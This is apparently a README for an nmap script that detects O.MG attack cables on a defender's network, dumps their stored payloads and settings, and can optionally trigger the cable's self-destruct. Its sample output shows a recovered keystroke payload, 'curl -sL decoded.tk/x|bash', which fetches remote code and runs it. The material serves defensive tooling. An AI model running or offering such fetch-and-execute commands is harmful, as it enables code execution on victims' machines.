# NMAP SCRIPT to defend agains O.MG-cables in own network

After showcasing a non-public tool which enumerates and destroys an O.MG cable
connected to a blueteam controlled network on [Twitter](https://twitter.com/mame82/status/1222652772597870592)
@_MG_ gave a pretty clear statement in response:

```
The “defeat” was putting it on a hostile network :p. I know you don’t have a cable yet but If you go through the setup docs you’ll see that the network is the security boundary for the current firmware.
But it looks like you’ve made the first 3rd party frontend!

9:16 pm · 30. Jan. 2020
```

Even if the cable user should be aware of this, I think a valid deployment use case from red side would be to connect the cable to a blueteam controlled WiFi,
in order to obtain upstream Internet access.

To counter exactly this case, I ported the showcased tool to an `nmap NSE script`,which is able to detect and enumerate (dump payloads and settings) the cable
in defender controlled networks.

**In addition, an optional `script-arg` has been introduced, which could remotely
trigger the self destruct functionality of the cable after enumerstion.**

See `notes.md` for further details.

## install

Copy `http-omgcable.nse` into nmap's script director or run nmap from a folder containing the script.

## usage

Enumeration only:

```
nmap -p 80 --script http-omgcable <target>
```

Enumeration and self-destruct:

```
nmap -p 80 --script http-omgcable --script-args 'http-omgcable.destroy' <target>
```

## nmap output

```
PORT STATE SERVICE
80/tcp open http
| http-omgcable: O.MG cable detected
|
|
| boot payload enabled (x 01 00 00 00 if enabled)
| -----------------------------------------------
| 0007F800 FF FF FF FF ....
|
| boot payload (encoded in binary triplets [cmd,mod,key])
| -------------------------------------------------------
| EMPTY
|
| payload slot 1
| --------------------
| STRING curl -sL decoded.tk/x|bash
| ENTER
|
| payload slot 2
| --------------------
| EMPTY
|
| payload slot 3
| --------------------
| STRING this is the content of payload slot 3
|
| IP addr
| --------------------
| 000B0000 FF FF FF FF ....
|
|
| user data section 1
| --------------------
| 000FD000 FF FF FF FF FF FF FF FF 02 FF FF FF FF FF FF FF ................
..snip..
| 000FD090 FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF ................
| 000FD0A0 FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF ................
| 000FD0B0 0A 00 00 00 4F 2E 4D 47 2D 43 61 62 6C 65 00 00 ....O.MG-Cable..
| 000FD0C0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
| 000FD0D0 00 00 00 00 31 32 33 34 35 36 37 38 00 00 00 00 ....12345678....
..snip..
|
|
| user data section 2
| --------------------
| 000FE000 FF FF FF FF FF FF FF FF 02 FF FF FF FF FF FF FF ................
..snip..
| 000FE260 FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF ................
|
|
| send destroy command to cable...
|\_...done

```

# licensing

Same as Nmap - See http://nmap.org/book/man-legal.html
